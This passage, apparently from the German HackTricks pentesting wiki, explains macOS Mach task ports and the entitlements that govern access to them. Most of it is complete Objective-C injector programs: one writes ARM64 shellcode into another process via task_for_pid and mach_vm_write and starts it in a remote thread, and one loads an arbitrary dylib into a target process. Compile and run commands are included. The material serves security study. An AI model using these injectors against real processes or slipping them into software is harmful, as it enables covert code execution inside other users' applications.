Um Aktionen innerhalb des Tasks auszuführen, benötigte der Task ein `SEND`-Recht für sich selbst, indem er `mach_task_self()` aufrief (was den `task_self_trap` (28) verwendet). Mit dieser Berechtigung kann ein Task verschiedene Aktionen ausführen, wie z.B.:

- `task_threads`: SEND-Recht über alle Task-Ports der Threads des Tasks erhalten
- `task_info`: Informationen über einen Task erhalten
- `task_suspend/resume`: Einen Task anhalten oder fortsetzen
- `task_[get/set]_special_port`
- `thread_create`: Einen Thread erstellen
- `task_[get/set]_state`: Task-Status steuern
- und mehr in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) zu finden sind

{% hint style="danger" %}
Beachten Sie, dass mit einem SEND-Recht über einen Task-Port eines **anderen Tasks** Aktionen über einen anderen Task ausgeführt werden können.
{% endhint %}

Darüber hinaus ist der Task-Port auch der **`vm_map`**-Port, der es ermöglicht, den Speicher innerhalb eines Tasks mit Funktionen wie `vm_read()` und `vm_write()` zu **lesen und zu manipulieren**. Dies bedeutet im Grunde genommen, dass ein Task mit SEND-Rechten über den Task-Port eines anderen Tasks in der Lage sein wird, **Code in diesen Task einzuspeisen**.

Denken Sie daran, dass, weil der **Kernel auch ein Task ist**, wenn es jemandem gelingt, **SEND-Berechtigungen** über den **`kernel_task`** zu erhalten, er den Kernel dazu bringen kann, beliebigen Code auszuführen (Jailbreaks).

- Rufen Sie `mach_task_self()` auf, um den **Namen** für diesen Port für den Aufrufer-Task zu **erhalten**. Dieser Port wird nur beim **`exec()`** vererbt; ein neuer Task, der mit `fork()` erstellt wurde, erhält einen neuen Task-Port (als Sonderfall erhält ein Task auch nach `exec()` in einem suid-Binary einen neuen Task-Port). Der einzige Weg, einen Task zu erstellen und seinen Port zu erhalten, besteht darin, den ["Port-Tausch-Tanz"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) während eines `fork()` durchzuführen.
- Dies sind die Einschränkungen für den Zugriff auf den Port (aus `macos_task_policy` aus dem Binär `AppleMobileFileIntegrity`):
  - Wenn die App die **`com.apple.security.get-task-allow`-Berechtigung** hat, können Prozesse desselben Benutzers auf den Task-Port zugreifen (üblicherweise von Xcode für Debugging hinzugefügt). Der **Notarisierungsprozess** wird dies nicht für Produktversionen zulassen.
  - Apps mit der **`com.apple.system-task-ports`-Berechtigung** können den Task-Port für jeden Prozess außer dem Kernel erhalten. In älteren Versionen wurde dies **`task_for_pid-allow`** genannt. Dies wird nur Apple-Anwendungen gewährt.
  - **Root kann auf Task-Ports** von Anwendungen zugreifen, die nicht mit einer **gehärteten** Laufzeitumgebung kompiliert wurden (und nicht von Apple stammen).

**Der Task-Name-Port:** Eine unprivilegierte Version des _Task-Ports_. Er verweist auf den Task, erlaubt jedoch nicht dessen Steuerung. Das Einzige, was darüber verfügbar zu sein scheint, ist `task_info()`.

### Shellcode-Injektion in Thread über Task-Port

Sie können ein Shellcode von hier abrufen:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kompilieren** Sie das vorherige Programm und fügen Sie die **Berechtigungen** hinzu, um in der Lage zu sein, Code mit demselben Benutzer einzuspritzen (ansonsten müssen Sie **sudo** verwenden).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Um dies auf iOS zu ermöglichen, benötigen Sie die Berechtigung `dynamic-codesigning`, um einen beschreibbaren Speicher ausführbar machen zu können.
{% endhint %}

### Dylib-Injektion in Thread über Task-Port

Auf macOS können **Threads** über **Mach** oder unter Verwendung der **posix `pthread`-API** manipuliert werden. Der Thread, den wir bei der vorherigen Injektion generiert haben, wurde mit der Mach-API generiert, daher **ist er nicht posix-konform**.

Es war möglich, einen einfachen Shellcode einzuspeisen, um einen Befehl auszuführen, weil er **nicht mit posix-konformen APIs arbeiten musste**, sondern nur mit Mach. **Komplexere Injektionen** würden erfordern, dass der **Thread** auch **posix-konform** ist.

Daher sollte der Thread zur **Verbesserung** die Methode **`pthread_create_from_mach_thread`** aufrufen, die einen gültigen pthread erstellt. Anschließend könnte dieser neue pthread **dlopen** aufrufen, um eine dylib aus dem System zu laden. Anstatt neuen Shellcode zu schreiben, um verschiedene Aktionen auszuführen, ist es möglich, benutzerdefinierte Bibliotheken zu laden.

Sie können **Beispiel-Dylibs** finden (zum Beispiel eine, die ein Protokoll generiert, dem Sie dann zuhören können):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Fehler beim Festlegen der Speicherberechtigungen für den Code des entfernten Threads: Fehler %s\n", mach_error_string(kr));
return (-4);
}

// Setze die Berechtigungen für den allokierten Stack-Speicher
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Fehler beim Festlegen der Speicherberechtigungen für den Stack des entfernten Threads: Fehler %s\n", mach_error_string(kr));
return (-4);
}


// Erstelle Thread zum Ausführen des Shellcodes
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // dies ist der echte Stack
//remoteStack64 -= 8;  // Ausrichtung von 16 erforderlich

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Fehler beim Erstellen des entfernten Threads: Fehler %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Verwendung: %s _pid_ _aktion_\n", argv[0]);
fprintf (stderr, "   _aktion_: Pfad zu einer Dylib auf der Festplatte\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nicht gefunden\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread-Hijacking über den Task-Port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bei dieser Technik wird ein Thread des Prozesses hijacked:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Grundlegende Informationen

XPC, was für XNU (den Kernel, der von macOS verwendet wird) Inter-Process Communication steht, ist ein Framework für die **Kommunikation zwischen Prozessen** auf macOS und iOS. XPC bietet einen Mechanismus für das **sichere, asynchrone Aufrufen von Methoden zwischen verschiedenen Prozessen** auf dem System. Es ist Teil des Sicherheitsparadigmas von Apple und ermöglicht die **Erstellung von privilegiert-getrennten Anwendungen**, bei denen jedes **Komponente** nur mit den **Berechtigungen läuft, die es benötigt**, um seine Aufgabe zu erledigen, wodurch potenzielle Schäden durch einen kompromittierten Prozess begrenzt werden.

Für weitere Informationen darüber, wie diese **Kommunikation funktioniert** und wie sie **anfällig sein könnte**, siehe:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG wurde erstellt, um den Prozess der Mach IPC-Codeerstellung zu **vereinfachen**. Dies liegt daran, dass bei der Programmierung von RPC viel Arbeit die gleichen Aktionen umfasst (Argumente verpacken, die Nachricht senden, die Daten im Server entpacken...).

MIC generiert im Wesentlichen den benötigten Code, damit Server und Client gemäß einer bestimmten Definition (in IDL - Interface Definition Language) kommunizieren können. Auch wenn der generierte Code hässlich ist, muss ein Entwickler ihn nur importieren und sein Code wird viel einfacher sein als zuvor.

Für weitere Informationen siehe:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Referenzen

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
